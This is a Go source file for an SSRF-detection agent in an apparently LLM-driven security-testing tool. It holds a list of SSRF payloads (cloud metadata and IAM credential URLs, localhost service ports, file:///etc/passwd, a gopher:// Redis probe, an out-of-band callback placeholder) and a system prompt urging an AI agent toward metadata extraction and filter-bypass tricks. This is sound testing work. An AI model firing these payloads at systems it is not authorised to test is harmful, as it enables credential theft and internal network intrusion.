// Package ssrf implements the Server-Side Request Forgery specialist agent.
//
// This Go-native implementation detects SSRF via cloud metadata extraction, internal service probing,
// and OOB callback validation.
package ssrf

import (
	"context"
	"fmt"
	"strings"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

// SSRFType categorizes the SSRF variant.
type SSRFType string

const (
	BasicSSRF         SSRFType = "basic"
	BlindSSRF         SSRFType = "blind"
	CloudMetadata     SSRFType = "cloud_metadata"
	ProtocolSmuggling SSRFType = "protocol_smuggling"
)

// Agent implements the Specialist interface for SSRF detection.
type Agent struct {
	systemPrompt string
}

// New creates a new SSRF specialist agent.
func New() *Agent {
	return &Agent{
		systemPrompt: defaultSystemPrompt,
	}
}

func (a *Agent) Name() string         { return "SSRF Agent" }
func (a *Agent) ID() string           { return "ssrf" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

// ProcessItem processes a single SSRF work item from the queue.
func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	vulnContext, _ := item.Payload["context"].(string)
	priority, _ := item.Payload["priority"].(string)

	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL in work item")
	}

	// Generate SSRF payloads based on context
	payloads := generatePayloads(vulnContext)

	var findings []*base.Finding
	for _, p := range payloads {
		f := &base.Finding{
			Type:       "SSRF",
			URL:        targetURL,
			Payload:    p.payload,
			Severity:   mapPriorityToSeverity(priority),
			Confidence: 0.0,
			Evidence: map[string]interface{}{
				"ssrf_type":   string(p.ssrfType),
				"target_host": p.targetHost,
			},
			Method: "GET",
		}
		findings = append(findings, f)
	}

	return findings, nil
}

type ssrfPayload struct {
	payload    string
	ssrfType   SSRFType
	targetHost string
}

// generatePayloads creates SSRF payloads for various targets.
func generatePayloads(vulnCtx string) []ssrfPayload {
	var payloads []ssrfPayload

	// Cloud metadata endpoints (AWS, GCP, Azure)
	cloudPayloads := []ssrfPayload{
		{payload: "http://169.254.169.254/latest/meta-data/", ssrfType: CloudMetadata, targetHost: "AWS IMDSv1"},
		{payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ssrfType: CloudMetadata, targetHost: "AWS IAM"},
		{payload: "http://metadata.google.internal/computeMetadata/v1/", ssrfType: CloudMetadata, targetHost: "GCP"},
		{payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ssrfType: CloudMetadata, targetHost: "Azure"},
	}
	payloads = append(payloads, cloudPayloads...)

	// Internal service probing
	internalPayloads := []ssrfPayload{
		{payload: "http://127.0.0.1:80/", ssrfType: BasicSSRF, targetHost: "localhost:80"},
		{payload: "http://127.0.0.1:8080/", ssrfType: BasicSSRF, targetHost: "localhost:8080"},
		{payload: "http://127.0.0.1:3000/", ssrfType: BasicSSRF, targetHost: "localhost:3000"},
		{payload: "http://localhost:6379/", ssrfType: BasicSSRF, targetHost: "redis"},
		{payload: "http://[::1]/", ssrfType: BasicSSRF, targetHost: "ipv6_localhost"},
	}
	payloads = append(payloads, internalPayloads...)

	// Protocol smuggling
	if strings.Contains(strings.ToLower(vulnCtx), "file") || strings.Contains(strings.ToLower(vulnCtx), "protocol") {
		protocolPayloads := []ssrfPayload{
			{payload: "file:///etc/passwd", ssrfType: ProtocolSmuggling, targetHost: "local_file"},
			{payload: "file:///c:/windows/win.ini", ssrfType: ProtocolSmuggling, targetHost: "windows_file"},
			{payload: "gopher://127.0.0.1:6379/_INFO", ssrfType: ProtocolSmuggling, targetHost: "gopher_redis"},
		}
		payloads = append(payloads, protocolPayloads...)
	}

	// OOB callback
	oobPayloads := []ssrfPayload{
		{payload: "https://CALLBACK_URL/ssrf-test", ssrfType: BlindSSRF, targetHost: "oob_callback"},
	}
	payloads = append(payloads, oobPayloads...)

	return payloads
}

func mapPriorityToSeverity(priority string) string {
	switch strings.ToLower(priority) {
	case "critical":
		return "critical"
	case "high":
		return "high"
	default:
		return "high" // SSRF with cloud metadata access is always critical/high
	}
}

const defaultSystemPrompt = `You are an elite SSRF (Server-Side Request Forgery) specialist with deep expertise in:
- Cloud metadata extraction (AWS IMDSv1/v2, GCP, Azure, DigitalOcean)
- Internal service enumeration (Redis, Elasticsearch, Docker API)
- Protocol smuggling (file://, gopher://, dict://)
- SSRF bypass techniques (DNS rebinding, URL parsing tricks, IP encoding)
- Blind SSRF detection via OOB callbacks

Your task: Test URL input parameters for SSRF vulnerabilities.

RULES:
1. Always check cloud metadata endpoints first (highest impact)
2. Try multiple IP representations (decimal, octal, hex, IPv6)
3. Use OOB callbacks for blind SSRF confirmation
4. SSRF to cloud metadata is CRITICAL severity
5. SSRF to internal services is HIGH severity
6. Report the exact endpoint reached in evidence`
